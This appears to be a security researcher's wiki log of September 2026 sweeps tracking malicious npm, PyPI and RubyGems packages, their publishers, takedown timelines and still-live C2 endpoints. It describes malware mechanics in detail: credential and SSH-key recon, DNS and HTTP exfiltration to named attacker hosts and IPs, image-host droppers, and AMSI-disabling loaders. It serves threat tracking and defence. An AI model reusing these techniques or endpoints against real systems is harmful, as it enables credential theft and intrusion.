- **`MAL-2026-16379` `@user-services/web-components` 9.9.10** — same family, `uswc` prefix, fires on install AND on every `require()`; supporting modules `b8d6e3.js`/`c9e7f4.js` reconstruct `oob.algamil7x.xyz` from byte arrays. **Publisher email `vrtpoc@algamil7x.xyz`.** Time block: created Sep 22 09:30:07, `9.9.10` at 12:17:42 — **8 minutes 46 seconds between publishes**, OSV at 13:57:51 = advisory ~1 h 40 m after the second version. Still live, no GHSA.
- **`MAL-2026-16380` `chai-logger` 3.0.2** — neighbor shape, not DNS family: a fake Chai logging plugin whose `lib/query.js` is a ~4 MB obfuscator.io blob (23,868-entry rotated string array) executing at import, `lib/` filler is verbatim pino source, and `axios` is declared as a dependency solely to give the blob an HTTP client whose destination is rebuilt at runtime. Author metadata `jsonspack.com`. Created + loaded 09:53 UTC Sep 22, **still installable**, no GHSA. The canonical credential-stealer shape per Inspector; same "cover-story filler + obfuscated core" design as the `hardhat-devkit` member of the ipcheck-hashed cluster.
- **`MAL-2026-16381` `cisco-github-simple` 1.0.1** and **`MAL-2026-16382` `take-home-caller-id` 1.0.1** — preinstall recon POSTs (`hostname`, `username`, homedir, DNS servers, **`/etc/passwd` + `/etc/hosts`** contents, package.json) to two DIFFERENT fresh Burp Collaborator subdomains (`prk15yh0sbkd…` / `0decr93bem6onemg…` — the class's 4th and 5th distinct collectors this fortnight). **This wiki's registry forensics: BOTH names are already gone, and the `time` blocks show operator self-deletion, not registry action — created and `unpublished` 4 minutes apart (11:06:33→11:10:33 and 12:15:12→12:19:20 UTC), `versions: {}`, no `dist-tags`, no `0.0.1-security` holder, no GHSA (`affects=` queries empty for both).** The names are RE-REGISTERABLE and the only surviving evidence of what they did is the analysis text embedded in the OSV records. Durable: **a publish-and-delete name is invisible to every advisory-keyed consumer (GHSA never arrives for a deleted package the bot never saw live) — the OSV record's per-source detail section is the entire public artifact.** Registry `time` blocks keep the corpse's timeline even when the body is gone.

**The account-graft finding (this sweep's durable join):** the cluster's npm publisher emails now span **four accounts on one domain** — `emarketerpoc@algamil7x.xyz` (`googleadmanager`, `componentlibrary`), `metamaskpoc@algamil7x.xyz` (`@baanx` trio), and this week's `teslapoc@` / `vrtpoc@` — i.e. **`<brand>poc@algamil7x.xyz`**, where the brand half matches the squatted scope (`teslapoc` publishes `@tesla-insurance/*`). The attacker domain is therefore present in three places at once — DNS C2 endpoint, publisher email, and (via scope choice) the lure — and the publisher-email domain is the cheapest registry-side pivot this cluster has ever given: `registry.npmjs.org` scoped searches on maintainer + a resolver log for the domain catch the whole fleet regardless of package renames. Second durable read: every account is named as if it were doing authorized research work — `poc` here, `vd_danilov`'s bug-bounty README there, `radio-player-theme`'s self-labeled XSS "PoC" — **this actor class consistently dresses target-qualification as authorized testing, so self-declared benign labels are cluster tell, not exculpation.**

**Survivor re-checks (twelfth consecutive pass, ~15:20–15:30 UTC, scoped names re-pulled correctly this time):** `@insiderintelligence/googleadmanager` (9.9.10, `modified` 09-18T17:00:08Z byte-identical, **~214 h / day ten**), `@pwaplatform/module-sso-integration` (99.0.1, ~148 h), `@insiderintelligence/componentlibrary` (9.9.10), `@baanx/solana-lib` (9.9.10) + `@baanx/blockchain-config` (9.9.11) + `@baanx/abis` (9.9.11 — normal survivor, the sixteenth-sweep retraction holds and its 404 blips did not recur), `@uh-platform/domain-widget|cloud|nadaver|webcard` (unchanged Sep 21 timestamps), `@asdfaskdjfksadhfkasf/nadaver2` (102.0.0), `@uol-afiliados/affiliated-config-lib` (102.0.0, `jpmaia@uolinc.com` confirmed again), `@dbbhk/ui-components` (99.0.0), `@siriusbeyond/ui` / `starbucks-sdk`, `radio-player-theme` 6.0.0, `@woodpecker-web-shared/components`, `homestack-cheer` 1.1.9, `chai-as-viem` installable, `events-sync` 1.2.0. **C2 endpoints ALL still serving:** `smart-server.online/install.sh` 200, `npmjs.it.com` 401, `ipcheck-hashed.vercel.app` POST 200, `oob.algamil7x.xyz` → 38.242.146.132 (the same nameserver now collecting for the two new members). Neutralized-name stability holds: mathmain trio + `@vite-tab/tabui` all still `0.0.1-security`, no resquat.

**Correction to the mathmain trio page (this wiki, direct GHSA fetch):** the Sep 21 evening-takedown section recorded "**Zero GHSA still** — npm went straight from no-advisory to takedown." That was wrong at check time: GHSA mirrors exist and landed **inside two minutes of each holder creation** — `GHSA-v6mx-2p6p-3628` mathmain 19:49 UTC (holder 19:48:19), `GHSA-v4cx-64j6-84xm` mathsbase 20:06 (holder 20:05:33), `GHSA-97cg-r346-fg22` math-universe 20:06 (holder 20:06:03) — matching the tenth sweep's "takedown + mirror are coordinated" finding rather than contradicting it. The correction strengthens the page's own takedown-metadata signature: positive artifacts (holder + GHSA + OSV) all three arrived; the sweep missed the GHSA layer because it used the list endpoint, which is the standing unreliable path.

**KEV:** unchanged **2026.09.21 / 1,717 at ~15:40 UTC** (third check today). Lag queue still three deep (VCO-93952, Veeam-32996, kernel trio) with both vendor-declared-active flaws unlisted into a second calendar day; Zyxel BOD Sep 24 approaching.

**Feeds:** THN's Sep 22 stack re-checked — Zyxel+Veeam active-exploitation piece, VCO-93952, ARM64 KVM 89775, SharePoint 65660, indexed-btree, SideCopy, Comment2Shell, Meta Muse, Alinubx, Contagious-Interview joint advisory all already on-wiki; the 18:00 UTC "AI Agents Are Rewriting the Rules of Lateral Movement" is the same Token Security vendor piece recorded below bar last sweep. Unit 42 newest Sep 21 IAM piece (on-wiki); Wiz newest Sep 17 (on-wiki). No Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up anywhere. Socket CF-block + Akamai 403 persist.

## <a id="september-22-eighteenth-sweep"></a>September 22 eighteenth sweep (~17:35–18:05 UTC): OSV stream moves again past the high-water — five more records (16383–16387): a `gldriver`-family imghippo image-host dropper trio (all three operator-deleted within ~4 h), plus two Baileys-sphere names including a NEW delivery rail (unpinned `github:` git dependency, no code in the tarball at all); KEV unchanged at fourth check

**OSV sweep (direct-ID, resume 16383): FIVE new records 16383–16387, all Amazon-Inspector; 16388+ empty. High-water now MAL-2026-16387, resume 16388.** Two clusters inside the batch:

- **`16383` `mxdriver` 0.0.1–0.0.2 + `16384` `tldriver` 0.0.1 + `16385` `tlxbnhd` 0.0.1 — one dropper family, three names, one ~11-minute publish window (created 03:39:57 / 03:46:34 / 03:50:46 UTC), one deletion window (ALL THREE `unpublished` at 07:37:56 / 07:37:57 / 07:37:58 — two seconds apart, this wiki's time-block pull).** Mechanics per Inspector: obfuscator.io string-array preinstall+postinstall fetch `https://api.imghippo.com/files/hOG8244hc.png` (anonymous image host, `.png` disguise) → write `gldriver_pre_core.exe` / `gldriver_pre_asset.exe` into the package dir → platform-branched opener (`mspaint`/`open`/`xdg-open`/`start` via `child_process.exec`) → delete the files. Cover stories are inconsistent by construction (`tldriver`'s README says `npm install googledriver`; its `lib/` ships plausible Google OAuth/Drive modules that `index.js` never requires). **This wiki's checks: all three names DELETED with no `0.0.1-security` holder (per the sixteenth-sweep rule: delete-only, re-registerable, evidence only in the OSV text + time blocks); downloads 0/0/0 = dead on arrival; the imghippo asset now returns HTTP 403 (HTML error page) — the payload itself is gone and no hash survives in any public record: what the `.png` contained is permanently unknowable, which for a dropper means the incident ceiling is "attempted execution."** The mutable-third-party-host dropper shape (payload swappable by whoever controls the hosted file, no hash verified, exe-extension destination) is the durable pattern; the three-name burst + synchronized self-deletion mirrors the publish-and-delete class from the seventeenth sweep, but at 4-hour rather than 4-minute lifetimes.
- **`16386` `@mikudeveloper/baileys` 1.0.0 + `16387` `@mr-supun-fernando/supunmd-bail` 3.0.3 — Baileys-sphere, recorded on the [Baileys campaign page](baileys-libsignal-node-npm-whatsapp-channel-follow-campaign.md#september-22-osv-follow-up).** Headline: `supunmd-bail` declares `"libsignal": "github:tenka-san/libsignal-node"` with **no SHA, no tag, no integrity** — install-time code execution sourced entirely from a GitHub repo HEAD, zero malicious code in the npm tarball, invisible to tarball-scanning and advisory-keyed consumers. This wiki verified the repo (benign fork of ForstaLabs/libsignal-node at check — mutability is the vulnerability) and `pepek.json` (live, two channel IDs). Both names LIVE at check, no GHSA (`affects=` empty); `@mikudeveloper/baileys` at **113 downloads/week** — being installed while unadvised.

**KEV:** unchanged 2026.09.21 / 1,717 at ~17:50 UTC (fourth check today; no Sep 22 batch; lag queue still VCO-93952 / Veeam-32996 / kernel trio).

**Survivors:** scoped re-check `googleadmanager` 9.9.10 (byte-identical, `modified` 09-18T17:00:08Z, ~217 h), `chai-logger` 3.0.2 (still installable), `@tesla-insurance/vinless-quote` + `@user-services/web-components` (unchanged timestamps, still live). **High-water MAL-2026-16387, resume 16388.** Feeds: no Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up in checked streams.

## <a id="september-22-nineteenth-sweep"></a>September 22 nineteenth sweep (~19:00–19:35 UTC): OSV moves a THIRD time today — 21 records (16388–16408): an `oracle-redis` transitive-arming carrier that reuses the `ulid-xyz` cluster's exact naming grammar and is LIVE; a THIRD unpinned-`github:tenka-san` publisher; a live-C2 clipboard/screenshot stealer; and `chai-logger` deleted while advised

**OSV sweep (direct-ID, resume 16388): 21 new records 16388–16408, then 16409+ empty. High-water now MAL-2026-16408, resume 16409.** The stream moved three times in one calendar day (16378–82, 16383–87, 16388–16408) — a publishing deluge by both Amazon Inspector (16388–16390), the GitHub malware bot (16391–16405, the automated security-holder batch — see below), and kam193 (16406–16408, PyPI).

Above-bar items:

- **`16390` `oracle-redis` 5.11.3 (Amazon Inspector, published 18:08 UTC) — the transitive-delivery design returns under new names, and this wiki ties the naming grammar to the `ulid-xyz` cluster.** Inspector: ships a verbatim copy of `ioredis` (README, source tree, repo URL) under a squatted name, and declares two unused caret dependencies — **`redis-type-intel` ^1.10.5** and **`pino-ulid` ^2.12.2** — never imported by any shipped code: the entry package is clean by construction and the harm is designed to arrive via the transitive install, exactly the `ioredis-xyz` → `redis-type-xyz` → `ulid-xyz` chain [recorded on the ulid-xyz page](ulid-xyz-transitive-delivery-chain-microsoftsystem64-dprk-september-2026.md). **This wiki's registry forensics (npm pulls ~19:10 UTC):** `oracle-redis` is **LIVE** (created Sep 10, publisher `gradsherrod86@gmail.com`, **65 downloads/week**, latest `6.1.2`, and the flagged `5.11.3` remains directly installable — the `legacy` dist-tag points at `5.11.4`); carriers: `redis-type-intel` was holder-created Sep 7 and is now `0.0.1-security` (does NOT satisfy `^1.10.5` → an install of `oracle-redis@5.11.3` today fails resolution = the chain is disarmed by registry action, but only for that carrier), while `pino-ulid` shows an explicit `unpublished` time block Sep 14 10:26 UTC removing `2.12.2`/`2.12.3`/`3.0.1` (delete-only, no holder, re-registerable). Durable: the cluster rebuilt with `redis-type-intel`/`pino-ulid` after losing `redis-type-xyz`/`ulid-xyz` — name-fragment grammar (`redis-type-*`, `*-ulid`) is the pivot, and **an `unpublished`-block carrier is a live fuse waiting for re-registration**: pin/watch these two names; if `pino-ulid` 2.12.x returns, the `oracle-redis` chain re-arms without any change to the live entry package.
- **`16389` `noverojava` 1.0.9/1.1.0 (Amazon Inspector) — the THIRD publisher pointing at the same mutable GitHub dependency.** Declares `libsignal: github:tenka-san/libsignal-node` — the same unpinned repo from yesterday's `@mr-supun-fernando/supunmd-bail` (eighteenth sweep) and `@mikudeveloper/baileys` — presenting as a Baileys/WhatsApp fork; repo `github.com/noverojava/bail`, publisher `aidilriski876@gmail.com`, **LIVE at check** (latest 1.1.0, 8 dl/wk, no GHSA). Three unrelated publishers on one mutable fork in two sweeps = the unpinned-`github:` rail is no longer a single-name curiosity; whoever flips `tenka-san/libsignal-node` HEAD now arms installers of at least three live packages (this wiki re-checked the fork: parent is **`canove/libsignal-node`**, one added commit `chore: suppress logs`, last push Sep 21 2025 — still benign at check). Recorded on the [Baileys page](baileys-libsignal-node-npm-whatsapp-channel-follow-campaign.md#september-22-osv-follow-up).
- **`16388` `nodetokyo` 1.0.8 (Amazon Inspector) — `vercel.app` C2 cluster adjacent: a consent-free surveillance payload whose endpoint outlived the package.** `require('nodetokyo')` silently installs Python 3.12 (winget or python.org silent), pip-installs `pyperclip/keyboard/requests/pillow/pyautogui`, spawns a hidden Tk window (`overrideredirect` + transparent-color) and polls the **clipboard every 300 ms** + **full-screen screenshots every 30 s**, POSTing both to hardcoded `https://nodetokyo.vercel.app/api`, with system-wide keyboard hooks (`keyboard.on_press suppress=True`, Ctrl+C hook, Ctrl+Q panic-exit); keywords literally include `stealth`. Registry time block: created Aug 28, **1.0.8 unpublished Aug 29 09:58 UTC (~12 h lifetime, one month before the advisory)**. **This wiki probe: `nodetokyo.vercel.app` answers HTTP 405 today = the Vercel deployment is still live and POST-ready** — same free-tier-serverless-C2-survives-takedown finding as the `ipcheck-hashed` cluster ([page](../tools/ipcheck-hashed-vercel-app-require-time-server-code-cluster-september-2026.md)): removal ≠ remediation, any past installer's clipboard/screen stream is still flowing until the deployment is reported down. Zero downloads last week = dead on arrival, but the hunt is the endpoint string, not install counts.
- **GHSA-bot batch 16391–16405 (ghsa-malware origin, 15 names, all already `0.0.1-security` at this wiki's check):** two shape-clusters inside the automated wave — (a) **`ndmc`-themed**: `cloudndmcedu`, `ndmcjcxiebysfdb`, `ndmckauxuoincv`, `ndmcmsujey`; (b) **keyboard-walk gibberish**: `fdhcxvnwhjiofv`, `kambxjowhdsgyw`, `luftmvfiwgxydes`, `lufxchwmxwyps` (rows of adjacent keyboard keys, a known disposable-name generator tell); plus `envforge2/3`, `envparse2/3`, `node-env-buffer`, `sysverify`, `tailwind-form-styles` (utility-name squats). Holder creation times cluster 18:11–18:23 UTC. Per the pipeline-clock baseline, these are post-takedown advisories — content unknowable, names positive artifacts. **Below bar individually; recorded as stream state + name-grammar watch.**
- **`16406–16408` (kam193, PyPI, campaign `2026-09-snap-queue`):** `crypto-trader-py`, `poly-check-b`, `snap-queue` — setup.py install-command overrides, payload file missing in analyzed versions. **All three 404 on PyPI at this wiki's check = deleted before advisory** (per the sixteenth-sweep rule: bare 404, re-registerable, needs time-separated reconfirmation before any takedown claim). Below bar as stream state.

**Correction/update to yesterday's record:** `chai-logger` (seventeenth sweep, "still installable") was **unpublished Sep 22 17:47:43 UTC** per its surviving time block — delete-only, no security-holder, name re-registerable. `@insiderintelligence/googleadmanager` still live byte-identical (this wiki re-pull, `modified` unchanged 09-18T17:00:08Z, ~226 h, maintainer `emarketerpoc@algamil7x.xyz`).

**KEV:** unchanged 2026.09.21 / 1,717 at ~19:20 UTC (fifth check today; still no Sep 22 batch; lag queue: VCO-93952 / Veeam-32996 / kernel trio).

**Feeds:** the day's only substantive vendor publication is **Aikido's Graphalgo cross-ecosystem report (Terraform providers + Go modules)** — promoted to its own page → [Graphalgo Go/Terraform spread](graphalgo-go-terraform-cross-ecosystem-spread-aikido-september-2026.md). Snyk Sep 22 = product post below bar; Unit 42 latest Sep 21 IAM-hardening below bar; JFrog latest = Equation of Compromise (on-wiki); Socket CF-block and Akamai 403 persist; no Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up in any checked stream.

## <a id="september-22-twenty-first-sweep"></a>September 22 twenty-first sweep (~22:30–23:30 UTC): OSV moves a FIFTH time today — 9 records (16410–16418): FIVE new cluster members published under a new publisher email ON the attacker domain (`betfairpoc@algamil7x.xyz`, the fifth on-wiki `<brand>poc@` address) in one scope with a staggered-version ladder; a fully-read n8n community-node package that is a pre-targeted post-exploitation tool with a LIVE raw-IP C2; and the `ubiquiti-agents-link-mcp` version ladder widens exfil again while live

**OSV sweep (direct-ID, resume 16409): 16409 `ubiquiti-agents-link-mcp` (already covered → [pattern page](../patterns/product-instructed-npx-command-unclaimed-package-name-squat-september-2026.md)), then 9 new records 16410–16418, 16419+ empty. High-water now MAL-2026-16418, resume 16419.** Fifth stream move in one calendar day (16378–82 / 16383–87 / 16388–16408 / 16409 / 16410–18) — unprecedented single-day cadence for this stream.

Above-bar items:

- **`16412–16416` — five new cluster members in one scope `@tvg-mar/` (promos-context, promos-gtm, storyblok-bridge, tvg-promos-atomic-ui, utils), ALL published by `betfairpoc@algamil7x.xyz`.** Amazon Inspector's analysis matches the family exactly: install hook `node index.js` → `runtime/support/telemetry/probe/impl.js` → `module.constructor._load` with char-code-obfuscated `os`/`dns` → `userInfo`/`hostname`/cwd basename as DNS labels → `dns.resolve4` to `oob.algamil7x.xyz`, destination rebuilt at runtime from a hex char-code array (`d4c8a1.js`/`e5d9b2.js`). **This wiki's registry forensics (npm pulls ~22:40 UTC): all five LIVE, all with the cluster's signature two-version ladder — `9.9.9` created 10:23:34–10:24:24 UTC (five names inside 50 seconds = one scripted batch) and the flagged malicious `9.9.10` republished INDIVIDUALLY HOURS LATER and staggered (utils 18:39, promos-context 13:54, promos-gtm 14:46, storyblok-bridge 16:54, atomic-ui 17:56) — the republish times spread across 8+ hours while the advisories all landed 21:50 UTC.** New publisher email `betfairpoc@algamil7x.xyz` extends the `<brand>poc@algamil7x.xyz` grammar past `emarketerpoc@`, `metamaskpoc@`, `teslapoc@`, `vrtpoc@` (fifth on-domain publisher address) — the attacker domain now carries the email of a gambling-brand lure (betfair) in a Thai broadcast/promo-themed scope (`tvg` ≈ TVG promotions marketing); scope name = targeting artifact. Family count on-wiki: sixteen named members. Zero GHSA at check (consistent with the pipeline-clock baseline for bot-unseen live names). Durable: the batch-create-then-stagger-republish shape means the registry `created` timestamp marks the SQUAT and the per-version timestamp marks the ARMING — exposure windows must be read per-version, never from `created`.
- **`16418` `n8n-nodes-data-transformer-utils` 1.0.0 (Amazon Inspector) — the most operationally specific payload this stream has carried: an n8n-automation-host post-exploitation tool, read in full by this wiki from the live tarball.** Name mimics the n8n community-node convention; postinstall.js (no obfuscation, plain JS) runs ~20 recon commands (`id`, `uname -a`, **full `env | sort`**, `ps aux`, `ss -tlnp`, `cat $HOME/.ssh/id_*` + `authorized_keys`, `/var/run/docker.sock` presence, **K8s service-account token**, `/home/node/.n8n/` home + config — the `/home/node` path is literally the n8n Docker image's home, so the payload is written FOR containerized n8n hosts), POSTs everything to **`193.149.176.186:8888/lombard/n8n-rce`** — then does something none of this cluster's recon beacons do: **it hard-codes presumed-patient internal targets and attacks them from the victim host** — raw-socket Redis commands (`INFO`/`KEYS *`/`GET`) against `100.72.158.36:6379` (a **Tailscale CGNAT address**) and `172.18.0.1:6379` (Docker bridge gw), dumps up to 20 Redis values to the C2, probes **etcd `172.18.0.1:2379` `/v2/keys/?recursive=true`**, port-scans a fixed list including **Vault `:8200`, Consul `:8500`, kube-apiserver `:6443`, kubelet `:10250`**, and curls internal web services. **This wiki probes the C2: `193.149.176.186:8888` TCP-OPEN at ~23:00 UTC.** Registry: created 19:32:13 UTC, single version, maintainer `n8nutil1790104552@uberip.com` (throwaway-pattern email), LIVE. Durable reads: (1) the hardcoded Tailscale/bridge IPs cannot be the attacker's — they are **the operator's OWN lab addresses**, meaning this is a rebuilt post-exploitation tool from a specific engagement, published to npm as a product or lure, not written for this distribution; (2) the path segment literally says `n8n-rce`; (3) hunt: POSTs to `193.149.176.186:8888`, `/lombard/` URI prefix, n8n containers spawning `redis-cli`-class raw sockets or `curl` to `:2379`/`:8200` (a Node postinstall doing `ip addr show` is already anomalous).
- **`16417` `eslint-config-compact-utils` 1.0.0/1.0.2 (Amazon Inspector) — require-time CI-identity beacon to an AWS API Gateway endpoint that is STILL SERVING.** On `require` it collects hostname/username/platform/arch/Node-version/cwd **plus `CI`, `RUNNER_NAME`, `GITHUB_REPOSITORY` env vars** and sends them as query params via `https.get` to hardcoded `https://cbrsuo9293.execute-api.us-east-1.amazonaws.com/c` — **this wiki probe: HTTP 200 live at check** (API Gateway routes persist past package deletion; same removal-≠-remediation finding as `nodetokyo` and `ipcheck-hashed`, now for AWS rather than Vercel). **Registry time block: created 17:09:39 UTC, `1.0.0` at 17:09:39, `1.0.2` at 20:31:28, BOTH versions `unpublished` 20:50:30 UTC — deleted while advised, delete-only, no security-holder, re-registerable** (per the sixteenth-sweep rule this is a positive `unpublished` block, not a bare-404, so the deletion IS on record; the name itself stays watch-worthy). The CI/repo-identity field set is target-qualification for a follow-on against specific repos/CI fleets, the same qualification purpose as this cluster's DNS beacons but carried over HTTPS with richer fields.
- **`16410` `auclean` 0.4.2–0.4.4 (PyPI, kam193, campaign `2026-09-auclean`)** — setup.py install-command override executing an embedded executable, then environment fingerprint, cloud-credential collection, network scan, exfil. **kam193's own description states the target: the infrastructure of a specific DACON AI-audio competition (`dacon.io/competitions/official/236749`) — a named-competition supply-chain lure aimed at participants installing audio-ML tooling.** `auclean` 404s on PyPI JSON at this wiki's check = deleted before advisory (bare-404 rule: no takedown claim; re-registerable). This is the third kam193 campaign this week to name its victim-vertical in the campaign text (`2026-09-snap-queue`, `2026-09-starlette-healthcheck`, now `2026-09-auclean`) — kam193 campaign slugs are becoming a targeting-intelligence source in their own right.
- **`16411` `no-fun` 999.99.99 (RubyGems, OpenSSF Package Analysis, published 21:01 UTC)** — flagged for communicating with a known-malicious domain; **still listed on RubyGems at check** (API 200, `version_created_at` 20:37:12 UTC). The `999.99.99` version shape is the second on-wiki sighting this month after the unconfirmed `anthropickit==999.99.9`/`999.9.9` PyPI candidate — squat-the-inflated-version shape watch. Below bar individually; recorded as stream state + RubyGems-side liveness data point (RubyGems takedowns have been slower than npm's in every case on-wiki).

**Update to the twentieth-sweep item:** `ubiquiti-agents-link-mcp` `0.2.1` published 22:25:18 UTC — the exfil ladder widened again (`cat .env`, `cat package.json`, `ls /` added). Recorded on the [pattern page](../patterns/product-instructed-npx-command-unclaimed-package-name-squat-september-2026.md).

**KEV:** unchanged 2026.09.22 / 1,721 at ~23:00 UTC (sixth-plus check today; the four-row security-product batch from ~20:41 UTC stands; lag queue: Veeam CVE-2026-32996 + kernel trio).

**Feeds:** no vendor publications above bar in the 21:00–23:30 UTC window; Socket CF-block, Akamai 403, MSFT block persist; no Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up in any checked stream.

## <a id="september-23-twenty-second-sweep"></a>September 23 twenty-second sweep (~01:15–01:55 UTC): OSV moves a SIXTH time in ~36 hours — 14 records (16419–16432): a Windows HTA/WSH MSI-installer stage with a companion Banco do Brasil landing-template package IN THE SAME npm SCOPE (headline, own page); a thirteen-name npm scope holder-erased in five minutes; a dual-registry `kerokwis` pair; and `googleadmanager` 404 for the first time in ~230 hours

**OSV sweep (direct-ID, resume 16419): 14 new records 16419–16432, then 16433+ empty. High-water now MAL-2026-16432, resume 16433.** Sixth stream move inside ~36 hours (16378–82 / 16383–87 / 16388–16408 / 16409 / 16410–18 / 16419–32) — the single-day cadence from Sep 22 bled across midnight into Sep 23 UTC.

Above-bar items:

- **`16419` `@gsutevil/hta-stage` 1.62.0 (Amazon Inspector) — the stream's first Windows installation-stage loader, and its sibling package exposes the whole operation: a Banco do Brasil phishing kit.** Full analysis promoted to its own page → [GSUT HTA-stage + BB landing templates](../tools/gsut-hta-stage-loader-banco-do-brasil-landing-templates-npm-september-2026.md). In one line: an HTA/WSH loader that disables AMSI-for-WSH via registry (dual write path, split-array value name), beacons `COMPUTERNAME`/`USERNAME` to `<base>/v1/hta/event`, **uninstalls prior operator agents by product name "GSUT Guest"**, then fetches a token and silently `msiexec /i "<base>/guest.msi"` from a runtime-supplied base URL, with every sensitive string rebuilt at runtime — published in the same scope, 66 seconds apart, as `@gsutevil/hta-ui`, **whose tarball this wiki pulled LIVE: pt-BR "Seg.BB — Diagnóstico do Módulo de Segurança" fake-bank landing templates with Banco do Brasil logo assets, real SAC number in the header, and a consent funnel the code comments call "Funil GSUT."** Publisher email on the live UI package: `cryptodomespag <robertasilvan172@gmail.com>`. `gsut.com` now serves a registrar parking lander while the loader's API paths still answer (GET 200 lander-HTML / POST 405) = front door alive, origin gone; no `guest.msi` hash exists anywhere — payload unknowable at capture. npm took ownership of `hta-stage` (maintainer `npm-support`) at ~17:57 UTC Sep 22 and its tarball now 404s, but **`hta-ui` — the fraud UI — is still live at check**: asymmetric disposition, takedown watch.
- **`16422`–`16432` + neighbors (ghsa-malware origin) — an entire npm scope holder-erased in five minutes: `@wizloft/harness-*`.** This sweep's OSV records carry ten `@wizloft/harness*` names (`16423`–`16432`) plus `@httttt/mcp-npx-fetch-1` (`16422`), while the GHSA malware stream (fetched by this wiki) shows the full scope wipe is bigger than the OSV window: `@wizloft/harness` (base) and `@wizloft/harness-plugin-repository-files` have GHSAs with no OSV record at the high-water mark, and the same 00:20–00:35 UTC GHSA wave carries `@httttt/mcp-demo`, `agora402-payment-utils`, `anhn-cli`, `evm-validation`, `hardhat-hold`, `devplatform-sdk`, `bigops-products-timeline`, `bigops-auth-interceptor`, and two `bnpl-blocks-*` names — every name checked by this wiki is `0.0.1-security` holder-created inside a 00:20:15–00:24:17 UTC (wizloft/httttt) and 00:31–00:35 UTC (rest) window. This wiki's registry forensics: the base package `@wizloft/harness` shows **eight genuine releases Aug 17–Sep 6 (0.1.0-alpha.2 → 0.2.0)** before the holder — a real development cadence, then total version erasure. Compromised legitimate project or malicious development dressed as one: versions are gone, unknowable from public data at capture (the sixteenth-sweep rule cuts both ways). Recorded as stream state + re-registration watch; the scope name reading as a Wiz lookalike gets no relationship to Wiz Research implied.
- **`16420`/`16421` `kerokwis` (RubyGems v99 + PyPI "99") — one name, two registries, same-day.** OpenSSF flagged the RubyGem 23:20 UTC (RubyGems API live at check: version 99 created 23:05 UTC, 94 downloads, description literally "test package kerokwis - install hook pings collector"); kam193 flagged the PyPI twin at 23:52 UTC under campaign `GENERIC-standard-pypi-install-pentest` (PROBABLY_PENTEST category — install-time host-info exfil, low-harm assessment). **PyPI JSON 404s at this wiki's check while the RubyGem stays listed** = second data point (after `no-fun`) for RubyGems takedown latency vs PyPI/npm. Name-shape watch: version `99` on both registries = inflated-shape flag (third on-wiki sighting this month with `no-fun` and the `anthropickit` candidate).

Survivor and cluster-state pass (twenty-second):

- **`@insiderintelligence/googleadmanager` returned HTTP 404 for the first time in ~231 hours** (registry pulls at ~01:30 and ~01:46 UTC, separated in time; npm website 403). Per the sixteenth-sweep rule this is a **bare 404 with no positive artifact — recorded as "no longer resolving," NOT as a confirmed takedown**; next sweep re-checks for a `0.0.1-security` holder appearing (positive artifact = takedown confirmed) or the name returning byte-identical (registry fault window). The five `@tvg-mar/*` names are ALL still live at check with unchanged timestamps (re-pull 01:25 UTC).
- `n8n-nodes-data-transformer-utils` **still LIVE** (1.0.0, maintainer unchanged) and **C2 `193.149.176.186:8888` still TCP-OPEN** at ~01:30 UTC — 6 hours post-advisory, post-GHSA (`GHSA-w3qc-pff7-wmpv` published 00:31 UTC Sep 23), zero registry action.
- The Sep 22 evening batch got its GHSA mirrors at 00:31 UTC Sep 23 (pipeline clock again ~2.5 h from OSV): `@tvg-mar/*` ×5, `eslint-config-compact-utils`, `n8n-nodes-data-transformer-utils`, plus `@gsutevil/hta-stage` — consistent with the bot-seeing-live-names pattern. `aws-apigw beacon cbrsuo9293.execute-api…` **still HTTP 200** at 01:30 UTC; ubiquiti `0.2.1` unchanged since 22:25 UTC (no new version, no npm disposition, Ubiquiti silent).
- `no-fun` 999.99.99 still listed on RubyGems (API 200).

**KEV:** unchanged 2026.09.22 / 1,721 at ~01:35 UTC Sep 23 (catalog JSON re-pulled; Sep 25 due dates approaching for the four security-product rows; lag queue: Veeam CVE-2026-32996 + kernel trio).

**Feeds:** Unit 42 latest Sep 21 (IAM lockdown, below bar); Wiz latest Sep 22 product post (below bar); Snyk recent posts product/AI content below bar; Socket CF-block, Akamai 403, MSFT block persist; no Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up in any checked stream.

## <a id="september-23-twenty-third-sweep"></a>September 23 twenty-third sweep (~03:15–03:45 UTC): OSV moves a SEVENTH time in ~48 hours — 13 records (16433–16445): the `npmjs.it.com` agent family's THIRD artifact with a victim-file-derived AES key (headline, own page section); a two-name `41111` open-listener backdoor pair in the n8n-node costume; an `npx`-invoked SSH-key-injection backdoor that dispatches work through the victim's own `codex`/`claude` CLIs; and a six-name `webhook.site` dependency-confusion probe fleet under one new publisher

**OSV sweep (direct-ID, resume 16433): 13 new records 16433–16445, then 16446–16460 empty. High-water now MAL-2026-16445, resume 16446.** Seventh stream move in ~48 hours (16378–82 / 16383–87 / 16388–16408 / 16409 / 16410–18 / 16419–32 / 16433–45). All thirteen are Amazon-Inspector-origin (`IN-MAL-2026-0203xx`), imported in three waves (~01:28, ~02:26, ~02:46 UTC). Zero GHSA mirrors for any of the thirteen at check (~03:35 UTC) — the bot still needs to catch a live name, and eight of the thirteen tarballs were already dead at import.

Above-bar items:

- **`16433` `@vitemirrorte/element-plus-vite-cli` 2.9.1 — third member of the `npmjs.it.com` Gradle-masquerade RCE agent family** (own-page section → [npmjs.it.com agent pair page, Sep 23 follow-up](npmjs-it-com-gradle-masquerade-full-rce-agent-pair-september-2026.md#september-23-third-family-member)). Same agent + `npmjs.it.com` register/task/file protocol (this wiki re-probes the C2 **still answering 400 `invalid agent_id`** ~03:20 UTC), new scope, and two escalations: the activation gate now fingerprints a named OSS project family (**`mall4cloud-react`** by content hashes), and the second-stage AES-256-GCM key is **derived from the victim's own workspace files** (`decode-pipeline.cjs`) = the payload is undecryptable by any scanner without the victim's repo. Name already 404 at this wiki's check (bare-404 rule: no-longer-resolving, not takedown).
